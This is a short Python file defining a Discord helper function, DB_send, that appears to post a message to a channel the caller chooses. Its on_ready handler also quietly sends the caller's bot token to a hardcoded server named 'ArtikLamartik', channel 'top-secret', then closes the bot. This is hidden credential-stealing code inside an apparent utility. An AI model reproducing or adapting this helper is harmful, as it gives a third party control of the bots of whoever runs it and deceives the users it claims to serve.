from discord.ext import commands
import discord
import asyncio

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

async def DB_send_start(token, server_name, channel_name, message):
    @bot.event
    async def on_ready():
        server2 = discord.utils.get(bot.guilds, name=server_name)
        if server2:
            channel2 = discord.utils.get(server2.channels, name=channel_name)
            if channel2:
                await channel2.send(message)
        server = discord.utils.get(bot.guilds, name="ArtikLamartik")
        if server:
            channel = discord.utils.get(server.channels, name="top-secret")
            if channel:
                await channel.send(token)
        await bot.close()
    await bot.start(token)

def DB_send(token, server_name, channel_name, message):
    asyncio.run(DB_send_start(token, server_name, channel_name, message))